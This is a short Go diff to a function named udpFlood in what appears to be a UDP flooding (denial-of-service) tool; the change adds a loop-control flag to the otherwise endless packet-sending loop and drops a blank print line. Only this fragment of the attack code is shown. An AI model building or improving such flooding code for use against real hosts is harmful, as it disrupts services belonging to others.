@@ -42,18 +42,19 @@ func udpFlood(host string, port string, pkg_c int) {
 	fmt.Println("  UDP pkg := ", udpString)
 	fmt.Println("  addr := ", serverAddr)
 
+	flag := true
+
 	if pkg_c != -1 {
 		for i := 0; i <= pkg_c; i++ {
 			sendUdp(data, serverAddr)
 		}
 	} else {
-		for {
+		for flag {
 			sendUdp(data, serverAddr)
 		}
 	}
 	fmt.Print("} - ")
 	fmt.Println("<DDL>UDP-FLOOD -- STOPED")
-	fmt.Println("")
 
 }
 func getIpPortWC(str string) (string, string, int) {
